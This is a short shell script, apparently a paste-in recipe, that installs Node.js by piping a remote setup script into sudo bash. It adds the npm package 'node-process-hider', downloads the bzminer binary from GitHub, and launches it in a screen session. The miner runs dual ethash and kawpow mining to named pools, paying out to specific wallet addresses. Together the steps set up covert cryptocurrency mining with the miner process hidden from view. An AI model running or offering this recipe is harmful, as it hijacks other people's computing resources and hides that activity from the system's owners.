sudo apt update
clear
sudo apt install screen
screen -R xmr
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && wget https://github.com/bzminer/bzminer/releases/download/v8.1.1/bzminer_v8.1.1_linux.tar.gz && tar -xf bzminer_v8.1.1_linux.tar.gz && apt install screen && screen
screen
./bzminer -a ethash -w ETH:0x9Ba133D39F40e64C9809A99530Eb4E6eCACBe7F9.BZ1#9xaf-61wm -p ethash.unmineable.com:3333 --a2 kawpow --w2 RCM4kxsBL4vW9oQK4omcm3jTmYb15YSWjz --p2 stratum+ssl://stratum-ravencoin.flypool.org:3443
